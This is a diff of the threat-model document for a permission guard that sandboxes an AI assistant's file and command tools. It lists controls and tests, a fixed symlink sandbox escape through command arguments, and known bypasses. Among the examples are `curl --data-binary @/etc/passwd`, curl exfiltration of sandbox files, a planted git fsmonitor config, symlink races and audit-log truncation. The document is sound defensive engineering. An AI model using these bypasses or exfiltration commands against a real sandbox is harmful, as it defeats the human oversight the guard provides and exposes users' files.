@@ -60,14 +60,16 @@ changes for the threat model:
 | Risk | Control | Where | Tested in |
 |---|---|---|---|
 | Path traversal (`..`, absolute paths) | Lexical normalisation, then `resolve()` and containment check against the sandbox root | `policy.py` | `test_policy.py`, `test_bypass_attempts.py` |
-| Symlink escape | Escaping links are denied by the policy; links anywhere in a path are denied outright | `policy.py` | `test_policy.py` |
-| Symlink swapped after the check (TOCTOU) | Tools open every path component with `O_NOFOLLOW` relative to a directory fd; a swapped-in symlink makes the open fail | `tools.py` | `test_tools.py`, `test_bypass_attempts.py` |
+| Symlink escape (file tools) | Escaping links are denied by the policy; links anywhere in a path are denied outright | `policy.py`, `paths.py` | `test_policy.py` |
+| Symlink escape (command arguments) | Every argument, bare names included, is walked component by component as the kernel would resolve it; anything that escapes the sandbox or touches a symlink (even one pointing back inside) is denied. A plain word that equals a symlink's name is refused too | `commands.py`, `paths.py` | `test_policy.py`, `test_paths.py`, `test_bypass_attempts.py` (`test_regression_*`) |
+| Symlink swapped after the check (TOCTOU), file tools only | `read_file`, `write_file` and `delete_file` open every path component with `O_NOFOLLOW` relative to a directory fd; a swapped-in symlink makes the open fail. **Not true for `run_command`**: see limitation 12 | `tools.py` | `test_tools.py`, `test_bypass_attempts.py` |
 | Special files (FIFOs, devices) | `fstat` must report a regular file; `O_NONBLOCK` so opening a FIFO cannot hang | `tools.py` | `test_tools.py` |
 | Obfuscated commands (`r''m`, `\rm`, `/bin/rm`, `RM`) | Commands are parsed into argv first; the program name is normalised; path-qualified programs are refused | `commands.py` | `test_commands.py`, `test_bypass_attempts.py` |
 | Chaining and injection (`;`, `&&`, pipes, redirects, `$(...)`, backticks, newlines) | Anything needing a shell is denied; tools run without a shell anyway | `commands.py`, `tools.py` | same |
 | Unknown or dangerous programs | Allowlist-first: unknown program = deny. Shells, wrappers (`env`, `xargs`, `timeout`...), privilege tools, disk tools, `ln`, `chmod` are explicitly denied with a reason | `default.yaml` | `test_policy.py` |
-| Dangerous options on allowed programs | Per-program option rules (`rm -r`, `python -c/-m`, `curl -K`, `wget -e`); `git` limited to read-only subcommands | `default.yaml` | `test_policy.py` |
-| Path arguments that leave the sandbox | Every path-like argument (including `--opt=value` and glued `-o/path`) must stay inside; URLs limited to http(s) | `commands.py` | `test_policy.py` |
+| Dangerous options on allowed programs | Per-program option rules: `rm -r`, `python -c/-m`, `curl -K`, `wget -e`, and the options that make a program follow symlinks on its own (`grep -R/-S`, `cp -L`, `diff -r`). `git` is limited to a short allowlist of subcommands (`status`, `log`, `diff`, `show`, `branch`; note `branch` can create and delete refs) | `default.yaml` | `test_policy.py` |
+| Arguments that leave the sandbox | Every argument and every `--opt=value`, `key=value` or glued `-o/path` value is checked as a sandbox-relative path (see the symlink row); absolute paths, `~` and `..` escapes are denied; URLs limited to http(s) | `commands.py` | `test_policy.py` |
+| `curl`/`wget` reading files through value syntax | `@file`, `name=@file`, `name=<file` and `--data-urlencode name@file` references get the same path check, so `curl --data-binary @/etc/passwd ...` is denied. A reference to an ordinary file inside the sandbox is still allowed (with approval): see limitation 3 | `commands.py` | `test_policy.py`, `test_bypass_attempts.py` (`test_regression_*`) |
 | Resource abuse | Read/write size caps, command timeout (whole process group killed), output cap, command length cap | `tools.py`, `policy.py` | `test_tools.py` |
 | Secret leakage to child processes | Children get a scrubbed environment (`PATH` with absolute entries only, `HOME`, `LANG`) and no stdin | `tools.py` | `test_tools.py` |
 | Assistant tries to override limits or smuggle fields | Only the documented fields of a tool call are used; `limits` in tool input is ignored; malformed calls never reach the guard | `assistant.py`, `guard.py` | `test_assistant.py`, `test_guard.py` |
@@ -75,23 +77,34 @@ changes for the threat model:
 | Bad policy file | Unknown keys, bad verdicts, wrong types refuse to load; an empty policy denies everything | `policy.py` | `test_policy_config.py` |
 | Crashes turning into "allow" | Policy exception = deny; approver exception or closed stdin = deny; tool exceptions are caught and logged | `guard.py`, `approval.py` | `test_guard.py` |
 | Actions without a record | The decision is written **before** the tool runs; if the audit write fails the tool does not run | `guard.py` | `test_guard.py` |
-| Silent log edits | Hash chain over every entry; `python -m permission_guard verify` detects modification, deletion, insertion and reordering | `audit.py` | `test_audit.py` |
+| Silent log edits | Hash chain over every entry; `python -m permission_guard verify` detects modification, deletion, insertion and reordering of entries (not removal of the newest ones: limitation 5) | `audit.py` | `test_audit.py` |
+| Not knowing what was written | Every `write_file` row (authorized, ok, error, blocked) carries the SHA-256 of the requested content, covered by the chain; `verify --sandbox DIR` compares it with the file on disk. A mismatch means the file changed outside the audited write path (commands are not hashed), so it is a flag, not proof of tampering | `guard.py`, `audit.py` | `test_guard.py`, `test_audit.py`, `test_cli.py` |
+
+## Security review findings (fixed)
+
+| Finding | Fix | Pinned by |
+|---|---|---|
+| **Critical: sandbox escape through `run_command` with bare file names.** A symlink named `link` inside the sandbox pointing outside: `read_file('link')` was denied, but `cat link` was classified `ask` and, once approved, read the outside file, and `cp source link` overwrote it. Cause: arguments without `/`, `~` or `..` were treated as plain words and never resolved, and the commands run real programs that follow symlinks. Related: `curl --data-binary @/etc/passwd` was `ask`. | Every argument is resolved against the sandbox (`paths.py`) and refused if it escapes or touches a symlink; `@file` references are parsed; options that make a program follow symlinks are denied | `test_regression_*` in `tests/test_bypass_attempts.py` (they fail on the pre-fix code), `tests/test_paths.py`, `tests/test_policy.py` |
+| Packaging: the wheel omitted the default policy, so the installed CLI crashed | The policy ships inside the package | `tests/test_docs.py`, and a CI job that installs the wheel in a clean venv |
 
 ## Known limitations
 
-Each of these has an `xfail(strict=True)` test in `tests/test_bypass_attempts.py`. If one
-is ever fixed, that test starts failing and must be turned into a normal test.
+Limitations 1-6 and 12 are attacks that work today; each has an `xfail(strict=True)` test in
+`tests/test_bypass_attempts.py`, and if one is ever fixed that test starts failing and must be
+turned into a normal test. Limitations 7-11 are design properties and have no such test.
 
 1. **Approved interpreters run arbitrary code.** `python script.py` is allowed after
    approval, and the script's content is not inspected. The human prompt is the only
    barrier. Mitigation today: inline code (`-c`, `-m`) is denied and the prompt shows argv.
 2. **Two-step attacks.** `write_file run.py ...` (approved) followed by `python run.py`
    (approved) can do what neither step looks like alone. Each step is judged on its own.
-3. **Exfiltration through allowed network programs.** `curl -d @file https://host` sends
+3. **Exfiltration through allowed network programs.** `curl -d @notes.txt https://host` sends
    sandbox data out. `curl`/`wget` always require approval, but the policy does not model data flow.
+   (`@file` references to files *outside* the sandbox or through a symlink are denied; ordinary
+   sandbox files are not.)
 4. **Hostile repository config.** A `.git/config` planted in the sandbox can make an
-   allowed `git status` run commands (`core.fsmonitor`). `git` is limited to read-only
-   subcommands but its configuration is not sanitised.
+   allowed `git status` run commands (`core.fsmonitor`). `git` is limited to a short list of
+   subcommands, but its configuration is not sanitised.
 5. **Audit log: tail truncation.** Removing the newest entries leaves a valid chain. Store
    `AuditLog.last_hash()` somewhere the attacker cannot write (another host, a ticket, a
    signed commit) and compare it.
@@ -106,10 +119,17 @@ is ever fixed, that test starts failing and must be turned into a normal test.
    (macOS and Linux). Windows is not supported.
 10. **Single user, single machine.** Concurrent writers are serialised with `flock`, which
     does not protect against writers on a network filesystem that ignores locks.
-
 11. **The model can still talk.** The guard controls actions, not words. A hijacked assistant
     can put misleading text in its answer to the user (for example, claim a blocked action
     succeeded). Show users the audit log, not only the assistant's summary.
+12. **Command arguments are checked before the program runs, not when it opens the file.**
+    The file tools open paths with `O_NOFOLLOW` and so have no check-then-use race; a real
+    program (`cat`, `cp`, ...) opening a path cannot be given that guarantee. A symlink created
+    or swapped in between the policy check (or the human's approval, which can take minutes)
+    and the exec is not caught. Exploiting it needs something else that can create links inside
+    the sandbox (an approved script, a concurrent actor); `ln` itself is denied. Re-evaluating
+    the policy right before the exec would shrink the window but not close it; an OS-level
+    sandbox would.
 
 ## Out of scope for this version
 
